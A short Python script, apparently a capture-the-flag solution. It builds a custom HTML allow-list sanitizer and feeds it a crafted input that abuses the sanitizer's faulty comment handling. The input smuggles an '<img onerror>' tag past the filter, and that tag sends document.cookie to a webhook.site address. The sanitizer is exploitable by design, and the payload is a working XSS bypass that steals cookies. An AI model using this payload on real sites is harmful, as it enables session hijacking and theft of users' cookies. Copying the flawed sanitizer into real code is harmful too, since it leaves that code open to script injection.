class TrustyParser:
    def __init__(self):
        self.allowed_tags = ['h1', 'h2', 'h3', 'div', 'p']
        self.result = ""
        self.tag_buffer = ""
        self.is_tag = False
        self.is_comment = False
        self.current_tag = ""

    def parse(self, html):
        for char in html:
            if self.is_comment:
                self.tag_buffer += char
                if self.tag_buffer.endswith("-->"):
                    self.result += self.tag_buffer  
                    self.is_comment = False
                    self.tag_buffer = ""  
                continue

            if char == '<':
                self.is_tag = True
                self.tag_buffer = char
            elif char == '>':
                self.tag_buffer += char
                self.is_tag = False

                if self.tag_buffer.startswith("<!--"):
                    self.is_comment = True
                    self.tag_buffer += char  
                elif self.is_allowed_tag(self.tag_buffer):
                    self.result += self.tag_buffer
                    if self.tag_buffer.startswith("</"):
                        self.current_tag = ""
                    else:
                        self.current_tag = self.tag_buffer.strip("<>/")
                self.tag_buffer = ""
            else:
                if self.is_tag:
                    self.tag_buffer += char
                elif self.current_tag:
                    self.result += char

        return self.result

    def is_allowed_tag(self, tag):
        if tag.startswith("</"):
            tag_name = tag[2:-1]
        else:
            tag_name = tag[1:].split(" ", 1)[0].rstrip(">")

        return tag_name in self.allowed_tags or '/' + tag_name in self.allowed_tags

parser= TrustyParser()
print(parser.parse("""
<!--
aa
-->
<img src="x" onerror="fetch('https://webhook.site/7cdec90d-6553-4521-b1d8-91b5e14aeb3e?flag='+document.cookie)">
<!--<-->"""))
